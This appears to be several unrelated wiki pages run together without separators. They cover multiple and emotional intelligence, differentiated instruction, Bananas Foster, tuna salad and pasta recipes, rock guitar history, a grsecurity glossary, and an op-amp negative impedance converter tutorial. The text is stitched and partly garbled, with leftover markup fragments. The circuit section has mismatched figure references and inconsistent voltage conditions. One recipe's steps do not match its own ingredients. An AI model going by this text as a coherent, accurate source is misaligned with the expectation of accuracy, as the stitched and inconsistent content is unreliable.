10)	“Existential Intelligence – concern with ‘ultimate’ issues … or the capacity to locate oneself with respect to such existential features of the human condition as the significance of life, the meaning of death ... and the potential to engage in transcendental concerns …” (ibid. p. 60).

In summary, Gardner referred to intelligence as “biopsychological potential of our species to process certain kinds of information in certain kinds of ways”, with each intelligence having its own characteristics of neural networks that functions alike across most human beings (ibid. p. 94).

'''&lt;font color=#FF0000&gt;Why Does Multiple Intelligence Matter?&lt;/font color&gt;'''

As a teacher, I believe it is important to know and to educate children and youth about the different kinds of intelligences; to inform students that it is their job to find out what they like and dislike, what their strengths and weaknesses are in terms of what subjects they like to learn and do.  Once students have this information, they can implement that knowledge in developing their own strengths, especially, and to appreciate them.  Students need to know that the world is full of opportunities that utilize their various intelligences and that the world is a better place because of these differences.  Armstrong (2003) modified these MI for younger students to understand. Armstrong emphasized that intelligences are different, but not one is better than another.  He also noted that you can develop and better whatever intelligences or abilities you have, whether they are weak or strong, and that you're not limited to one type of intelligence. Perhaps, then, developing intelligences comes down to having opportunities and exposure in schools to the kinds of activities that would further help develop these intelligences.  Many subject areas and activities can be covered in schools, but not all are privileged to go beyond what's introduced in schools, like learning a musical instrument, for example.  Some students may not be able to afford an instrument of their own, nor the private music lessons.  When various intelligences are developed, students are provided with choices in their future in terms of work and play. Gardner stated that &quot;we can improve education by addressing the MI of our students&quot; (as cited by Thirteen.org, 2004).

'''&lt;big&gt;* better at solving problems in relationships&quot;&lt;/big&gt;

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 


Emotional Intelligence (EI) is defined by Daniel Goleman (1995) as abilities such as motivation, impulse control, delay of gratification, and regulating one’s mood when frustrated.  He argued that despite having general intelligence which may yield good grades and high SAT scores, these “other characteristics” of EI, play a key role in the outcome of one’s success and happiness.  Goleman further proposed that unlike IQ scores that cannot be altered much by education and experience, EI can be “learned and improved upon by children” (1995, p. 34).  

Referring back to Gardner’s MI definitions of personal intelligences, interpersonal intelligence is the ability to “discern and respond appropriately to the moods, temperaments, motivations, and desires of other people” as intrapersonal intelligence or self-knowledge is the ability to “access one’s own feelings” and to “discriminate among them and draw upon them to guide behavior” (Gardner, 1989, 1993, as cited by Goleman, 1995, p. 39).  Salovey and Mayer (1995, as cited by Goleman, 1995) further explored the theory of EI, expanding the personal intelligences into five main domains:

1)	Emotional self-awareness – self-awareness as key to emotional intelligence: recognizing a feeling as it happens and the ability to monitor one’s feelings from moment to moment.

2)	Managing emotions – actually handling the emotions or feelings so they are appropriate: to “soothe oneself, to shake of rampant anxiety, gloom or irritability… and the ability to bounce back from life’s setbacks and upsets”.

3)	Motivating Oneself – the ability to reach a goal via paying attention, self-motivating, mastery, and creativity.  This includes self control by “delaying gratification and stifling impulsiveness” so they reach a state of high productivity.

4)	Recognizing emotions in others – or the ability to empathize, and utilize “people skill” which manifests in altruism via recognizing what others need or want.  Such people may work in caring professions, such as therapists and teachers.

5)	Handling relationships – or the “art of relationships” is “managing emotions in others”.  Such skills may be effective in leadership roles and manifests in popularity or “anything that relies on interacting smoothly with others” (ibid. p. 43-44).

Goleman (1995) surveyed that there is a growing worldwide trend that present generation of children are “more troubled emotionally … (they are) more lonely and depressed, more angry and unruly, more nervous and prone to worry, more impulsive and aggressive” (p. xiii).  I believe this is not just a concern for teachers and parents, but for the good of a community, general society, and the world.  From observation, I have noticed that it is harder to teach children and youth with emotional disabilities; it is harder for them to process materials that utilize MI and EI; they feel unsuccessful and feelings of failure and anxiety spiral into feelings of shame and low self-esteem, which further promotes agitation, stress, and sometimes anger. It becomes a cycle that is truly hard to break.  It manifests into attitudes of uncaring, unempathetic views about themselves and the world, bullying or lashing out, and self-destructive behaviors.  Some historical figures come to mind when destructiveness or hate is acted against certain societies and people.  Terrorists and Hitler come to mind.  And what about the disconnectedness and disturbances of emotions which fuel the violence in schools and in the streets that we have come to witness in recent years?

Goleman introduced a “new vision of what schools can do to educate the whole student, bringing together mind and heart in the classroom …when education will routinely include inculcating essential human competencies such as self-awareness, self-control, and empathy, and the arts of listening, resolving conflicts and cooperation&quot; (ibid. p. xiv).  Goleman proposed that by building a curriculum based on EI that are developmentally appropriate throughout the growing years, emotional literacy can have many educational and lifelong benefits (1995).

Perhaps we should not wait for our youth to be identified or labeled with emotional disabilities before providing services and education to serve and protect their emotional intelligences. I work in a special education setting with special educators, but I wonder what would happen if we, as teachers, were all special educators to meet our student's emotional, as well as cognitive, intelligences.  I believe a good teacher does look out for the welfare of student's emotions as well as their grades.  At my school, we have incorporated a time to build on teacher-student relationships, or as we call it, &quot;mentor-mentee relationships&quot;.  We are hoping that by building these relationships and fostering emotional connections, the students will more likely succeed in their academic/MI goals, while aiding in their personal/emotional growth.

by Will Memery

== Learning Targets ==

Upon completion, the reader should understand the following:

1. A definition of differentiated instruction and its elements.

2. How differentiated instruction can be applied in the classroom and its usefulness as a teaching tool.

== Introduction ==

In a traditional classroom, all students are required to learn via the same teaching method, create meaning the same way, and show their understanding of the material they have been taught through the same testing methods.  However it is highly unlikely that all students respond in the same manner to traditional teaching and testing methods.  Tomlinson asserts,
      &quot;a single seventh grade heterogeneous language arts class is likely to include students who can 
      read and comprehend as well as most college learners; students who can barely decode words, 
      comprehend meaning, or apply basic information; and students who fall somewhere between these 
      extremes.  There are students whose primary interests lie in science, sports, music, or a dozen 
      other fields.  There are students who learn best by working alone and those who are most 
      successful working in groups.  Further, the learning profiles of young adolescents often change 
      rapidly as they develop.  There simply is no single learning template for the general middle 
      school class&quot; (Tomlinson, 1995, para. 1).  
This same rule likely applies to students across all subjects and grade levels.  Differentiated instruction allows teachers to adapt their methods to account for students of different learning abilities and styles, and can help these students learn and be tested in a way that is more appropriate for them.

== What is differentiated instruction? ==

&quot;Differentiated instruction is matching instruction to meet the different needs of learners in a given classroom&quot; (Kosanovich, Ladinsky, Nelson, &amp; Torgesen, 2007, p.1) .  It is important for teachers to consider the different ways that they can adapt their teaching to encourage understanding among students.  Varying techniques and finding new ways to keep students interested in classroom material are key to student participation and learning.  
      &quot;Teachers can differentiate at least four classroom elements based on student readiness, 
      interest, or learning profile: (1) content--what the student needs to learn or how the 
      student will get access to the information; (2) process--activities in which the student 
      engages in order to make sense of or master the content; (3) products--culminating projects   
      that ask the student to rehearse, apply, and extend what he or she has learned in a unit; and 
      (4) learning environment--the way the classroom works and feels&quot; (Tomlinson, 2000, para. 2).  
Therefore differentiated instruction can be applied in a variety of ways.  Different mediums can be explored (i.e. movies or technology as opposed to strictly reading assignments), different teaching methods can be used (group work or games as opposed to lecture), and different assessment methods can also be used (presentations or projects as opposed to standard tests).  Given the variety of methods that teachers have at their disposal, it will certainly take time and effort to determine which one works best for a particular student, but if this effort is taken students will likely be better able to relate to the material being taught.

It is virtually impossible to tailor a classroom to suit every student, especially in schools with large classes and a variety of different types of learners.  However there are methods to determine the types of learners in a classroom and develop learning goals that will give every student the best chance of succeeding.  These methods include:

1. Pre-assess students at the outset of the year to begin understanding their interests, preferred ways of learning, and fundamental skills. Use teacher-made surveys on interest, attitude about the subject, and learning preferences.

2. Pre-assess at the outset of each unit to determine what students know, understand, and can do related to the topic before the unit begins.

3. Meet with small groups in class.

4. Use multiple presentation/teaching modes.

5. Scaffold reading success.

6. Use differentiated homework.

7. Encourage learning and expressing learning in varied ways (Tomlinson, 2005, p.3).


Students can also assist each other through differentiated instruction.  Methods such as peer teaching (students teaching each other), reading buddies (students helping each other create meaning in texts), and buddy studies (students working in pairs or groups on a project) are effective ways for students to assist one another (Theroux).  These methods benefit all students involved, both the ones being taught or helped and the ones teaching or helping.  It is also important to consider that &quot;[s]tudent’s readiness varies depending on personal talents and interests, so we must remain open to the concept that a student may be below grade level in one subject at the same time as being above grade level in another subject&quot; (Theroux).  Therefore it is important to determine a student's abilities in each individual subject rather than assuming their skill in one subject applies to all subjects.

The evaluation and grading process can also be adapted in a differentiated instruction classroom.  A test is not always the most effective method of evaluating a student's understanding of course material, since some students do not perform well on tests in general.  Hall states, &quot;Assessments may be formal or informal, including interviews, surveys, performance assessments, and more formal evaluation procedures&quot; (Hall).  While standardized testing is necessary, a student's success on a standardized test depends on the student's understanding of course materials.  Varied methods of testing may be more effective to evaluate this understanding and help a teacher determine if a student needs additional help with course material.

== Differentiated Instruction in Practice ==

Differentiated instruction is a useful tool for teachers of all age groups.  An example of its use is provided by the Florida Center for Reading Research, where teachers of grades K-3 use Guided Reading and Skills-Focused Lessons in Reading First schools.  The two methods are very different, and each is designed to help students with specific reading needs.  The first is Guided Reading.

      In broad overview, a typical Guided Reading lesson occurs as students read text that has 
      been selected to be at an appropriate level of difficulty. The teacher’s role is to provide 
      supports to students in the appropriate use of a variety of strategies to identify words and 
      construct meaning from the passage. Instruction from the teacher is provided primarily 
      through questioning students and scaffolding more accurate responses when they make errors 
      during reading. Guided Reading provides a context in which the teacher can monitor and guide 
      the student’s application of specific skills in decoding and comprehension to construct 
      meaning while reading (Kosanovich, et al., 2007, p.3).

While Guided Reading can be used to help students understand the content of texts, Skills-Focused Lessons are used to improve students' word comprehension. 

      Skills-Focused Lessons are teacher-planned lessons that provide the opportunity for more 
      systematic and focused practice on a relatively small number of critical elements at a time 
      (e.g., unknown consonant digraphs, vowel teams, r-controlled vowels, etc.). They would also 
      provide the opportunity for sustained, systematic, and interesting “word work” (e.g., Beck, 
      2006) in order to build fluency and confidence in the application of these skills to reading 
      words. These lessons could draw upon lesson formats and content from the core reading program 
      to reinforce knowledge and skill that was only weakly learned when it was taught in the whole 
      group format. In schools that serve a high proportion of poor and minority students, it does 
      not seem reasonable to expect that most students will be able to master many of the skills 
      they are taught if they are only presented and explained during whole group instruction. Many 
      students will need explicit re-teaching of both knowledge elements and skills, as well as 
      extended opportunities to practice the application of these skills in a variety of contexts 
      ranging from individual words, to phrases, to sentences, to connected text. Skills-Focused 
      Lessons will be successful to the extent that they are fast-paced, interactive, and targeted 
      appropriately on critical skills for each reading group (Kosanovich, et al., 2007, p.3-4).

The Guided Reading method gives the instructor the ability to work individually with students to monitor reading and then evaluate and address problems that they might have with specific reading skills.  The Skills-Focused Lesson allows the instructor to group students according to difficulties they are having and create a lesson (i.e. a game) which will improve these skills.  It is important for teachers to understand the areas in which their students need the most help and tailor their lesson plans to fit these students.  Some students may need more help with reading comprehension, while some may need more help with word recognition and pronunciation.  Some students may need help in both of these areas.  The use of differentiated instruction can help teach students the specific skills they need, and this theory can be applied across grade levels and subjects.

== Conclusion ==

Teachers must be able to adapt their curriculum to accommodate students' learning needs.  It is vital to first identify these needs and then create varying lesson plans that cause students to look at material in different ways.  By doing so students will have a greater chance of comprehending material and will feel more confident in their abilities as learners.  &quot;Use the old analogy of getting into a house when teaching students: the easiest way into a house is through the front or back door, but you can also get into a house by using a window, crawlspace, or chimney. Be prepared to offer alternative teaching methods for children who don’t learn in a conservative manner&quot; (Tkatchov &amp; Pollnow, 2008, p.2).

Down in New Orleans, where Bananas Foster was invented, they'll bring out this hot plate and make the dish table side, including a spectacular flambé. 

== Ingredients ==
* 4 slightly unripe bananas, peeled and halved lengthwise
* 2 ounces semisweet chocolate, finely chopped
* 2 tbs unsalted butter
* 1/2 cup dark rum
* 2 tsp orange zest, finely grated
* Pinch of salt
* 1/4 cup granulated sugar
* 1/2 tsp freshly ground allspice
* 1/2 tsp freshly grated nutmeg
* 1/2 tsp freshly ground cinnamon
* 1 tbs pure vanilla extract
* Powdered sugar

== Procedure ==
#Combine all ingredients except bananas, powdered sugar, orange, and rum in a large skillet over medium high heat. Once mixture comes to a boil add bananas, making sure to keep at least 1/2 an inch between them. Cook for 1 minute per side.
#Remove bananas from pan and keep warm. Bring mixture again to a strong boil over high heat. Turn off the heat and add rum. If rum has not ignited by itself, do so carefully either with a firestick or a long fireplace match. Wait until flames die out before stirring in zest.
#Spoon sauce over bananas and dust with powdered sugar. Serve warm with some ice cream.</text>

Yes, canned tuna is the poster child for gross canned food, but this salad will change that.

== Ingredients ==
* 1 (12 oz.) can albacore tuna (water pack), drained
* Salt and freshly ground black pepper, to taste
* 2 tsp Dijon mustard
* 2 tbs freshly squeezed lemon juice
* 2 tsp grated lemon zest
* 6 tbs extra-virgin olive oil
* 1/4 cup fresh basil
* 2 tbs fresh rosemary, finely chopped
* 1/4 cup fresh oregano
* 1/4 cup flat-leaf parsley
* 1/4 cup fresh marjoram
* Hot sauce, to taste
* 1 tbs Worcestershire sauce
* 1/2 cup crumbled feta cheese

== Procedure ==
#Combine juice, zest, mustard, hot sauce, and Worcestershire sauce. Slowly stream in olive oil while whisking continuously until oil has been integrated. Season to taste with salt and freshly ground black pepper.
#Combine remaining ingredients except for cheese. Add dressing and toss to coat. Sprinkle with feta before serving.</text>

[[File:BouncingTownshend.jpg|thumb|right|350px|The Who]]
Rock guitar developed out of the rock 'n' roll guitar style of the 1950s and rock 'n' roll evolved out of the blues and country 'n' western music of an earlier period. In all these genres the guitar has played a central role and the interchange of ideas and style has provided the guitarist with a large volume of work to draw from.

The term ''rock'' was first used to describe the bands of the 1960s and 70s. Though the label ''rock 'n' roll'' was still in common use. It was during the 1960s that advances in sound technology allowed musicians to explore the sonic spectrum. The Beatles were one of the first bands to take advantage of the new studio technology and effects with their album ''Sergeant Pepper's Lonely Hearts Club Band''. This focus on the studio being an integral component in rock music has led too some producers and sound engineers becoming as well-known as the bands whose careers they shaped.

Many of these sixties bands started their careers playing rock 'n' roll or the blues. The music began to change in this decade; stereo became the standard and bands started to experiment with effects and amps and the blues form gave way to extended jams. The studio evolved new recording techniques and equipment and this led to a higher fidelity for long-playing vinyl records. Driven by the freedom that all these developments allowed, Rock music moved further away from its blues roots and into the realms of psychedelia.

The standard four-piece rock band line-up was a product of the fifties and sixties. It is still many decades later considered to be the ideal. The guitarist as soloist was always a feature of rock 'n' roll with artists such as Chuck Berry, Eddie Cochran, Duane Eddy and Buddy Holly cited as early influences on later guitarists. These early ''rock 'n' roll'' solos were short and rhythmic. The idea of the virtuoso rock guitarist began with the early psychedelia experiments. Guitarists were experimenting with effects and feedback and were free to play extended pieces. This led to a new approach to the guitar: extended lead guitar solos, delay effects, double-tracking, improvisation, and feedback. Jimi Hendrix, Eric Clapton and Jeff Beck are three guitarists who took the sixties forms they had been playing into the decade of the seventies. All three added or expanded the sounds and techniques for playing rock guitar.

The rock bands that had defined the sixties went on to dominate the seventies. Pink Floyd, The Beatles, The Who, The Rolling Stones are some of those sixties bands. As the seventies progressed, rock music created three important sub-genres: heavy metal, glam rock and progressive rock. All three styles still featured the guitar and if there was any differences between this new music and the earlier rock music, it was one of style not form. As the seventies neared the end of the decade; there was a turn away from the seventies rock sound with the arrival of punk rock. Punk rock guitar style still relied on the ''rock 'n' roll'' favourites: barre chords, chordal rhythm and distortion. However punk rock didn't feature long guitar solos and the songs were generally short. This was a return to the short length of the original ''rock 'n' roll'' ideals. The roots of punk music can be heard in the first album by The Stooges (released 1969), which didn't sell that well in America and England on first release. However the anarchic life-style and music of The Stooges caught the imagination of the next generation of guitarists. This is best heard in The Ramones ''Sheena Is A Punk Rocker'' which is the first song to feature the words &quot;punk rocker&quot;.

This book uses many different terms, some of which have the same meaning. We have listed some of these terms and their definitions here. The book also contains inline links to relevant Wikipedia articles.

; policy : The policy is '''a system-wide set of rules''' enforced by grsecurity. A very good description is offered in the [[w:Mandatory_access_control|mandatory access control]] article: &quot;Any operation by any subject on any object will be tested against the set of authorization rules (aka policy) to determine if the operation is allowed.&quot;
; access control list : From a related [[w:Access_control_list|Wikipedia article]]&amp;#58; &quot;An access control list (ACL) is '''a list of permissions attached to an object'''. The list specifies who or what is allowed to access the object and what operations are allowed to be performed on the object.&quot; In the context of this book, an ACL is used to mean a single role or subject definition, or the whole policy file.
; ruleset : Ruleset is used much in the same way as &quot;access control list&quot;. It is perhaps more often used to refer to role or subject definitions than the whole policy file.
; object : An object is a part of the system that is used by the programs running on the system. It can be an absolute path to a file or a directory&amp;#59; a [[../Appendix/Capability_Names_and_Descriptions|capability]]&amp;#59; a [[../Appendix/System_Resources|system resource]]&amp;#59; a [[../Appendix/PaX_Flags|PaX flag]]&amp;#59; network access (IP ACLs).
; subject: '''A subject uses and accesses objects''' and the ruleset of the subject enforces what objects it may use and in what way. In practice a subject is most often a program running on the system. In grsecurity, a subject is defined as an absolute path to the actual program executable (e.g. ''/sbin/init'') or a directory (e.g. ''/lib/hal/scripts'').
; role : A role is an abstraction that encompasses traditional users and groups that exist in [[w:Linux_distribution|Linux distributions]] and special roles, that are specific to grsecurity. Roles can be used to split the responsibility of system administration into smaller logical sets of responsibilities, such as &quot;database administrator&quot; or &quot;DNS administrator&quot;. Compare this approach to having a single [[w:Superuser|superuser]] (e.g. ''root'') that is used to do every administrative task on the system.
; domain : With domains you can combine users that do not belong in the same group as well as groups so that they share a single policy. Domains work just like roles.

&lt;br style=&quot;clear:both;&quot;/&gt;

== Introduction ==

=== What a INIC operating in linear mode means ===

In order to make a current-driven negative resistor, we have produced a voltage that is proportional to the current flowing through it. Now, in order to make a voltage-driven negative resistor, we have to do the opposite - to produce current that is proportional to the voltage across it. A negative impedance converter with current inversion (INIC) is such an op-amp implementation of a true negative resistor with N-shaped IV curve. This composed circuit consists of two components (Fig. 1b): a &quot;positive&quot; resistor R and a non-inverting amplifier with gain of 2 that amplifies the input voltage. The amplifier is implemented by the op-amp OA and the two equal resistors R1 = R2 = R constituting a voltage divider with ratio 0.5 (see also the “b” figures below). The whole circuit acts as a &quot;helping&quot; current source that injects a current I&lt;sub&gt;OUT&lt;/sub&gt; through the resistor R into the input circuit and tries to raise its voltage. Thus, the output voltage affects the input voltage (this great phenomenon is referred to as positive feedback).
The whole op-amp circuit behaves as a current source producing a current I&lt;sub&gt;OUT&lt;/sub&gt; that is equivalent to the current flowing through the corresponding “positive” resistor R (I&lt;sub&gt;OUT&lt;/sub&gt; = V&lt;sub&gt;IN&lt;/sub&gt;/R). The op-amp as though converts the &quot;positive&quot; resistance R into a negative -R; that is why, this circuit is named negative impedance converter. As the current flowing through the circuit has an opposite direction to the current flowing through the initial &quot;positive&quot; resistor R, it is named negative impedance converter with current inversion.

=== How to investigate the linear mode of INIC ===

INIC, like VNIC, is a two-terminal circuit; so, to give an idea of how it operates, we have to measure its IV curve. For this purpose, we have to apply a varying input voltage across the circuit (the constant voltage source is the ideal input source for INIC acting in linear mode) and to measure the output current flowing between its terminals. There are four typical for the circuit operation points over the IV curve representing the corresponding three circuit states. For each of them, we may draw the corresponding picture of partial IV curve (from beginning to the current point) and the corresponding circuit diagram representing the current state. Let's label the first sequence of pictures with extension &quot;a&quot; and place them on the left; accordingly, to label the second sequence of pictures with extension &quot;b&quot; and place them on the right.
Because the purpose of this paper is rather to reveal the basic idea behind this exotic circuit solution than to calculate its parameters a qualitative heuristic approach is used.

[[Image:Linear_inic_1a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 1a: An N-shaped IV curve of current inversion NIC.&lt;/center&gt;]]

[[Image:Linear_inic_1b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 1b: Enriching the classic circuit diagram of current inversion NIC by superimposed voltage bars and current loops.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

== Investigating the circuit at ideal driving conditions ==

The ideal input source for an INIC acting in linear mode is the constant voltage source (CVS). If we apply a negative voltage to INIC (Fig. 2a), the input voltage  source &quot;pulls down&quot; the bottom end of the resistor R (connected to the non-inverting input) toward the ground. The op-amp decreases its output voltage trying to restore the equilibrium (it &quot;pulls down&quot; the top end of the resistor R toward the negative supply rail).

=== Left positive resistance region ===

==== Negative input voltage, negative output current ====

From the initial point 0 to point 1 (Fig. 2a), we have applied high enough negative voltage |V&lt;sub&gt;IN&lt;/sub&gt;| &gt; |V&lt;sub&gt;SAT-&lt;/sub&gt;| to INIC so that the voltage of the non-inverting input is more negative than the voltage of the inverting input. As a result, the op-amp stays in negative saturation. The circuit has positive resistance; it behaves as a real voltage source with a constant voltage V&lt;sub&gt;SAT-&lt;/sub&gt; and an internal resistance R (see the equivalent circuit on the left side of Fig. 2b). It is represented by a linear IV curve on Fig. 2a (the part from point 0 to point 1).

[[Image:Linear_inic_2a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 2a: Scanning the left bottom part of the curve (0-1).&lt;/center&gt;]]

[[Image:Linear_inic_2b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 2b: Applying a high negative voltage &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &gt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Negative input voltage, zero output current ====

At point 1 (Fig. 3a), we apply a relatively moderate negative voltage |V&lt;sub&gt;IN&lt;/sub&gt;| &gt; |V&lt;sub&gt;SAT-&lt;/sub&gt;| to INIC so that the voltage of the non-inverting input is more negative than the voltage of the inverting input. As a result, the op-amp continues staying in negative saturation. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_inic_3a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 3a: Investigating the point 1 of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_3b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 3b: Applying a relatively moderate negative voltage &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; = &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Negative input voltage, positive output current ====

From point 1 to point 2 (Fig. 4a), we apply a moderate negative voltage |V&lt;sub&gt;SAT-&lt;/sub&gt;|/2 &lt; |V&lt;sub&gt;IN&lt;/sub&gt;| &lt; |V&lt;sub&gt;SAT-&lt;/sub&gt;| to INIC so that the voltage of the non-inverting input remains more negative than the voltage of the inverting input. As a result, the op-amp continues staying in negative saturation. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_inic_4a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 4a: Scanning the left top part (1 - 2) of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_4b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 4b: Applying a moderate negative voltage &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/2 &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Middle negative resistance region ===

==== Negative input voltage, positive output current ====

The “magic” of negative resistance begins at point 2. From point 2 to point 3 (Fig. 3b), we apply a low voltage |V&lt;sub&gt;IN&lt;/sub&gt;| &lt; |V&lt;sub&gt;SAT-&lt;/sub&gt;|/2  from INIC (Fig. 3a). The op-amp goes out of saturation and begins operating in active region. The voltage of the non-inverting input is almost equal to the voltage of the inverting input. The input voltage decreases continuously and the output current decreases as well. As a result, the op-amp IV curve moves to the right and the crossing operating point slides over a new dynamic IV curve representing the negative resistance. Note it is not a real IV curve; it is an artificial, imaginary IV curve having a negative slope and passing through the origin of the coordinate system. The whole circuit behaves as a &quot;helping&quot; dynamic current source that is connected to the common load in parallel and in the same direction with the input current source.

[[Image:Linear_inic_5a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 5a: Scanning the left middle part (2 - 3) of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_5b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 5b: Applying a low negative voltage &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;IN&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt; &lt; &lt;nowiki&gt;|&lt;/nowiki&gt;V&lt;sub&gt;SAT-&lt;/sub&gt;&lt;nowiki&gt;|&lt;/nowiki&gt;/2 to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Zero input voltage, zero output current ====

At point 3 there is no input voltage and the op-amp produces zero output voltage. The whole circuit behaves just as a resistor R. On the graphical presentation, the op-amp IV curve crosses the origin.

[[Image:Linear_inic_6a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 6a: Investigating the point 3 of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_6b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 6b: Applying zero voltage V&lt;sub&gt;IN&lt;/sub&gt; = 0 to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input voltage, negative output current ====

From point 3 to point 4 (Fig. 4b), we begin applying low positive voltage V&lt;sub&gt;IN&lt;/sub&gt; &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/2 to INIC. The op-amp continues operating in active region and the voltage of the inverting input is almost equal to the voltage of the non-inverting input. The input voltage increases continuously and the output current increases as well. The op-amp IV curve continues moving to the right and the crossing operating point continues sliding over the negative resistance IV curve. The whole circuit continues behaving as a &quot;helping&quot; dynamic current source that is connected to the common load in parallel and in the same direction with the input current source.

[[Image:Linear_inic_7a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 7a: Scanning the right middle part (3 - 4) of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_7b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 7b: Applying a low positive voltage 0 &lt; V&lt;sub&gt;IN&lt;/sub&gt; &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;/2 to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Right positive resistance region ===

==== Positive input voltage, negative output current ====

From point 4 to point 5 (Fig. 8a), we apply a moderate positive voltage V&lt;sub&gt;SAT+&lt;/sub&gt;|/2 &lt; V&lt;sub&gt;IN&lt;/sub&gt;| &lt; V&lt;sub&gt;SAT+&lt;/sub&gt; to INIC so that the voltage of the non-inverting input remains more positive than the voltage of the inverting input. As a result, the op-amp continues staying in positive saturation. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_inic_8a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 8a: Scanning the right bottom part (4 - 5) of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_8b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 8b: Applying a moderate positive voltage V&lt;sub&gt;SAT+&lt;/sub&gt;/2 &lt; V&lt;sub&gt;IN&lt;/sub&gt; &lt; V&lt;sub&gt;SAT+&lt;/sub&gt;) to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input voltage, zero output current ====

At point 5 (Fig. 9a), we apply a relatively moderate positive voltage V&lt;sub&gt;IN&lt;/sub&gt; = V&lt;sub&gt;SAT-&lt;/sub&gt; to INIC so that the voltage of the non-inverting input remains more positive than the voltage of the inverting input (Fig. 9b). As a result, the op-amp continues staying in positive saturation. The circuit has positive resistance; it continues behaving as a real voltage source.

[[Image:Linear_inic_9a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 9a: Investigating the point 5 of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_9b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 9b: Applying a relatively moderate positive voltage V&lt;sub&gt;IN&lt;/sub&gt; = V&lt;sub&gt;SAT+&lt;/sub&gt; to INIC.&lt;/center&gt;]]

&lt;br style=&quot;clear:both;&quot;/&gt;

==== Positive input voltage, positive output current ====

From point 5 to point 6 (Fig. 10a), we apply high positive voltage V&lt;sub&gt;IN&lt;/sub&gt; &gt; V&lt;sub&gt;SAT+&lt;/sub&gt; to INIC. As the voltage of the non-inverting input is more positive than the voltage of the inverting input, the op-amp stays in positive saturation. The circuit has positive resistance; it behaves as a real voltage source with a constant voltage &lt;sub&gt;VSAT+&lt;/sub&gt; and an internal resistance R (see the equivalent circuit on the left side of Fig. 10b). It is represented by a linear IV curve on Fig. 10b (the part from point 5 to point 6).

[[Image:Linear_inic_10a_1000.jpg|left|thumb|355px|&lt;center&gt;Fig. 10a: Scanning the right top part (5 - 6) of the curve.&lt;/center&gt;]]

[[Image:Linear_inic_10b_1000.jpg|right|thumb|395px|&lt;center&gt;Fig. 10b: Applying a high positive voltage V&lt;sub&gt;IN&lt;/sub&gt; &gt; V&lt;sub&gt;SAT+&lt;/sub&gt; to INIC.&lt;/center&gt;]]

      <text xml:space="preserve">{{recipe}} 

== Ingredients ==
* 1 cup uncooked penne pasta
* 1 cup ricotta cheese
* 4 eggs, separated and brought to room temperature
* 1/4 cup unsalted butter, melted
* 1/8 tsp cream of tartar
* Pinch of salt
* 1/4 tsp freshly ground black pepper
* 1 tsp minced garlic
* 1 tbs flat-leaf parsley, finely chopped
* 1/2 cup mozzarella cheese
* 1 1/2 cups tomato paste
* 4 leaves fresh basil

== Procedure ==
#In a gallon of salted, boiling water, cook pasta to al dente. Drain and rinse with cold water. Set aside.
#Combine ricotta, egg yolks, butter, salt, pepper, garlic, parsley, and tomato paste. Fold in cooked pasta. Set aside.
#In a spotlessly clean metal bowl, beat egg whites to stiff peaks with cream of tartar. Gently fold into pasta mixture.
#Pour into a parchment-lined high-sided roasting pan. Sprinkle with mozzarella cheese and cover with aluminum foil. Bake in the center of a 375 degree oven for 15 minutes.
